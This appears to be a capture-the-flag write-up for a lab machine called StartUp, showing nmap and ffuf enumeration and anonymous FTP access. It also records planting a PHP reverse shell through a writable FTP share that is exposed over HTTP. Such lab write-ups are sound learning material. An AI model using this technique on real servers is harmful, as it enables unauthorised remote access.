---
sidebar_position: 1
title: StartUp
sidebar_label: Enumeration
description: Abuse Traditional vulnerabilities via Untraditional means.
keywords: [startup tryhackme, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, ftp, privilege escalation]
---


:::note Box Description

Abuse Traditional vulnerabilities via Untraditional means.

:::


## NMAP

- <b style={{ color: 'DarkKhaki' }}>[FTP: 21]</b> <b style={{ color: 'Coral' }}>[SSH: 22]</b> <b style={{ color: 'LightSkyBlue' }}>[HTTP: 80]</b>

```log
Nmap scan report for 10.10.58.21
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.11.30.40
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```


## FFUF

- **Files from `FTP` Server are Stored Here:** <b style={{ color: 'SandyBrown' }}>[IP:80/files]</b>

```log
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.58.21/FUZZ
 :: Wordlist         : FUZZ: Dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

files                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 205ms]
```


## FTP

- **We can Login as `Anonymous`**
- There is nothing of Important in the Share.

```log
ftp> ls -al
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
ftp> mget notice.txt important.jpg
```

- **File:** `notice.txt`

```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. 
People downloading documents from our website will think we are a joke! 
Now I dont know who it is, but Maya is looking pretty sus.
```

<br/>
<br/>

- We have the Permissions to **Upload** Files inside the `FTP` Server.
- **Uploading Reverse Shell:** `php-reverse-shell.php`
- **Reverse Shell Location:** <b style={{ color: 'SandyBrown' }}>[IP:80/files/ftp/php-reverse-shell.php]</b>

```log
ftp> ls -al
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
ftp> cd ftp
ftp> ls -al
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
ftp> put php-reverse-shell.phtml 
226 Transfer complete.
```


<br/>

---
## Content Discovery


- **Hidden Comment:** <b style={{ color: 'SandyBrown' }}>[IP:80]</b>

```html
<!--when are we gonna update this??-->
```


- **`FTP` Upload Location:** <b style={{ color: 'SandyBrown' }}>[IP:80/files]</b>

```
   [ICO]          Name        Last modified   Size Description
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[PARENTDIR] Parent Directory                     -  
[DIR]       ftp/             2020-11-12 04:53    -  
[IMG]       important.jpg    2020-11-12 04:02 246K  
[TXT]       notice.txt       2020-11-12 04:53  208  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

- <b style={{ color: 'SandyBrown' }}>[IP:80/files/ftp]</b>
- Location of the Uploaded **Reverse Shell** through `FTP`

```
   [ICO]             Name            Last modified   Size Description
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[PARENTDIR] Parent Directory                            -  
[ ]         php-reverse-shell.phtml 2022-10-07 08:36 5.4K  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---